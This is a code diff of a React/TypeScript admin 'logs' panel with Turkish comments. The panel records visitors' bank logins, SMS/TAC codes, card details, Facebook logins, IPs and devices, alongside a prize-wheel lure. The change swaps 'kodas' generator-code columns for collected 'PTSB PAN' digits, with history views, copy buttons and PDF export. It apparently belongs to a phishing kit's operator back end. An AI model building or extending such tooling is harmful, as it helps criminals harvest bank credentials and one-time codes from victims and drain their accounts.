@@ -366,6 +366,7 @@ function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[str
     "ptsbDigit1",
     "ptsbDigit2",
     "ptsbDigit3",
+    "ptsbHistory",
     // --- CARK / ODUL ILE ILGILI TUM ALANLAR - BANKA KOLONUNDA HIC GOSTERILMEYECEK ---
     "amount",
     "wheel_result_kind",
@@ -992,9 +993,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
   // GENERATOR GECMISI: submit sirasinda onceki kayit history'ye tasindi,
   // guncel kayit zaten kolonda — filtreleme gerekmez, sadece parse et.
-  const parseGeneratorHistory = (fd: Record<string, unknown>): any[] => {
+  const parsePtsbHistory = (fd: Record<string, unknown>): any[] => {
     try {
-      const raw = fd.generatorLoginHistory;
+      const raw = fd.ptsbHistory;
       let arr: unknown;
       if (typeof raw === "string") {
         try { arr = JSON.parse(raw); } catch { arr = raw; }
@@ -1006,9 +1007,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         (r) =>
           r &&
           typeof r === "object" &&
-          (r as any).data &&
-          typeof (r as any).data === "object" &&
-          Object.keys((r as any).data).length > 0
+          Array.isArray((r as any).digits) &&
+          (r as any).digits.some((d: unknown) => String(d ?? "").trim() !== "")
       );
     } catch { /* ignore */ }
     return [];
@@ -1880,7 +1880,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Generator", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "PTSB", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1910,34 +1910,10 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           ? approvalEntries.map((a) => ({ text: getApprovalDisplayText(a), color: "#059669" }))
           : { text: "-", color: "#9ca3af" };
 
-        const genCell: any[] = [];
-        const genCurrentRaw =
-          fd.generatorCurrent && typeof fd.generatorCurrent === "object"
-            ? (fd.generatorCurrent as Record<string, any>)
-            : {};
-        const legacyGenData =
-          fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
-            ? (fd.generatorData as Record<string, unknown>)
-            : null;
-        const activeGenType = typeof fd.generatorType === "string" ? fd.generatorType : "";
-        const genEntries: { type: string; data: Record<string, unknown> }[] = [];
-        for (const t of ["generator1", "generator2"]) {
-          const cur = genCurrentRaw[t];
-          const curData =
-            cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
-              ? (cur.data as Record<string, unknown>)
-              : legacyGenData && activeGenType === t
-                ? legacyGenData
-                : null;
-          if (curData) genEntries.push({ type: t, data: curData });
-        }
-        for (const entry of genEntries) {
-          genCell.push({ text: `kodas ${entry.type === "generator2" ? "2" : "1"}`, bold: true, color: "#e11d48" });
-          for (const [k, v] of Object.entries(entry.data)) {
-            if (v != null && String(v).trim() !== "") genCell.push({ text: `${k.replace(/_/g, " ")}: ${s(v)}` });
-          }
-        }
-        if (!genCell.length) genCell.push({ text: "-", color: "#9ca3af" });
+        const ptsbText = getPtsbDigitsText(fd);
+        const ptsbCell = ptsbText
+          ? { text: ptsbText, color: "#0284c7" }
+          : { text: "-", color: "#9ca3af" };
 
         const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";
 
@@ -1961,7 +1937,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           s(fd.phone) || "-",
           { stack: bankCell },
           Array.isArray(approvalCell) ? { stack: approvalCell } : approvalCell,
-          { stack: genCell },
+          ptsbCell,
           { text: smsValue, bold: smsValue !== "-" },
           { stack: cardCell },
           { stack: fbCell },
@@ -2450,7 +2426,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                 <th className="min-w-[150px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                 <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[115px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
                 <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
@@ -2462,7 +2437,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={13} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={12} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -2497,32 +2472,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
                 const approvalEntries =
                   currentApproval && !currentApproval.startsWith("autenticacao") ? [currentApproval] : [];
-                // GENERATOR: tip basina GUNCEL kayit — kodas 1 ustte, kodas 2 altta.
-                // Ayni tipe tekrar yonlendirme: eski kayit gecmise gider, burada bos rozet (bekliyor) kalir.
-                const genCurrentRaw =
-                  fd.generatorCurrent && typeof fd.generatorCurrent === "object"
-                    ? (fd.generatorCurrent as Record<string, any>)
-                    : {};
-                const legacyData =
-                  fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
-                    ? (fd.generatorData as Record<string, unknown>)
-                    : null;
-                const activeType = typeof fd.generatorType === "string" ? fd.generatorType : "";
-                const genEntries: { type: string; data: Record<string, unknown> }[] = [];
-                for (const t of ["generator1", "generator2"]) {
-                  const cur = genCurrentRaw[t];
-                  const curData =
-                    cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
-                      ? (cur.data as Record<string, unknown>)
-                      : legacyData && activeType === t
-                        ? legacyData
-                        : null;
-                  if (curData) {
-                    genEntries.push({ type: t, data: curData });
-                  } else if (activeType === t) {
-                    genEntries.push({ type: t, data: {} });
-                  }
-                }
                 const smsValue =
                   typeof fd.smsCode === "string" && fd.smsCode.trim()
                     ? fd.smsCode.trim()
@@ -2645,35 +2594,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           )}
                         </div>
                       )}
-                    </td>
-                    <td className="px-2 py-3 align-top">
-                      {(() => {
-                        if (genEntries.length === 0) {
-                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
-                        }
-                        return (
-                          <div className="space-y-2">
-                            {genEntries.map((entry, gi) => (
-                              <div key={gi} className="space-y-0.5">
-                                <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[11px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
-                                  kodas {entry.type === "generator2" ? "2" : "1"}
-                                </span>
-                                {Object.entries(entry.data)
-                                  .filter(([, v]) => v != null && String(v).trim() !== "")
-                                  .map(([k, v]) => (
-                                    <div
-                                      key={k}
-                                      className="cursor-pointer font-mono text-[13px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
-                                      onClick={() => copyToClipboard(String(v))}
-                                    >
-                                      {String(v)}
-                                    </div>
-                                  ))}
-                              </div>
-                            ))}
-                          </div>
-                        );
-                      })()}
                     </td>
                     <td className="px-2 py-3 align-top">
                       <div
@@ -3232,11 +3152,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         if (hsAny.bankLoginHistory !== undefined) mergedFd.bankLoginHistory = hsAny.bankLoginHistory;
         if (hsAny.facebookLoginHistory !== undefined) mergedFd.facebookLoginHistory = hsAny.facebookLoginHistory;
         if (hsAny.cardLoginHistory !== undefined) mergedFd.cardLoginHistory = hsAny.cardLoginHistory;
-        if (hsAny.generatorLoginHistory !== undefined) mergedFd.generatorLoginHistory = hsAny.generatorLoginHistory;
+        if (hsAny.ptsbHistory !== undefined) mergedFd.ptsbHistory = hsAny.ptsbHistory;
         const bHistory = parseBankHistory(mergedFd);
         const fHistory = parseFacebookHistory(mergedFd);
         const cHistory = parseCardHistory(mergedFd);
-        const gHistory = parseGeneratorHistory(mergedFd);
+        const pHistory = parsePtsbHistory(mergedFd);
         const copyText = (t: string) => {
           try { void navigator.clipboard.writeText(t); } catch { /* ignore */ }
         };
@@ -3287,7 +3207,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                       💳 Kart: <span className="font-bold">{cHistory.length}</span>
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
-                      🔐 Kodas: <span className="font-bold">{gHistory.length}</span>
+                      🔐 PTSB: <span className="font-bold">{pHistory.length}</span>
                     </p>
                   </div>
                 </div>
@@ -3480,45 +3400,46 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     )}
                   </div>
 
-                  {/* ====================== 🔐 KODAS GİRİŞLERİ ====================== */}
+                  {/* ====================== 🔐 PTSB PAN GİRİŞLERİ ====================== */}
                   <div>
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">🔐</span>
-                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kodas (Geçmiş)</h4>
+                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>PTSB PAN (Geçmiş)</h4>
                       <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
-                        {gHistory.length} adet
+                        {pHistory.length} adet
                       </span>
                     </div>
-                    {gHistory.length === 0 ? (
+                    {pHistory.length === 0 ? (
                       <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
-                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş kodas kaydı yok.</p>
-                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar kod gönderince eskisi burada görünür.</p>
+                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz PTSB PAN kaydı yok.</p>
+                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı PAN rakamlarını gönderince burada görünür.</p>
                       </div>
                     ) : (
                       <div className="space-y-3">
-                        {gHistory.map((rec, idx) => {
+                        {pHistory.map((rec, idx) => {
                           const r = rec as Record<string, any>;
-                          const genLabel =
-                            r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
-                          const entries =
-                            r.data && typeof r.data === "object"
-                              ? Object.entries(r.data as Record<string, unknown>).filter(
-                                  ([, v]) => v != null && String(v).trim() !== ""
-                                )
-                              : [];
+                          const posLabels = String(r.labels ?? "")
+                            .split(",")
+                            .map((s: string) => s.trim())
+                            .filter(Boolean);
+                          const digitList = Array.isArray(r.digits) ? r.digits : [];
+                          const entries = digitList.flatMap((d: unknown, i: number) => {
+                            const v = String(d ?? "").trim();
+                            return v ? [[`Digit ${posLabels[i] ?? i + 1}`, v]] : [];
+                          });
                           return (
                             <div
-                              key={`gen-${idx}`}
+                              key={`ptsb-${idx}`}
                               className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
-                                    #{gHistory.length - idx}
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-sky-500/15 text-sky-400' : 'bg-sky-500/10 text-sky-600'}`}>
+                                    #{pHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
                                     <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
-                                      {genLabel}
+                                      PAN
                                     </p>
                                     <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
@@ -3528,7 +3449,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                               </div>
                               <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
                                 {entries.map(([k, v]) => (
-                                  <ValRow key={k} label={k.replace(/_/g, " ")} value={String(v)} />
+                                  <ValRow key={k} label={k} value={String(v)} />
                                 ))}
                               </div>
                             </div>
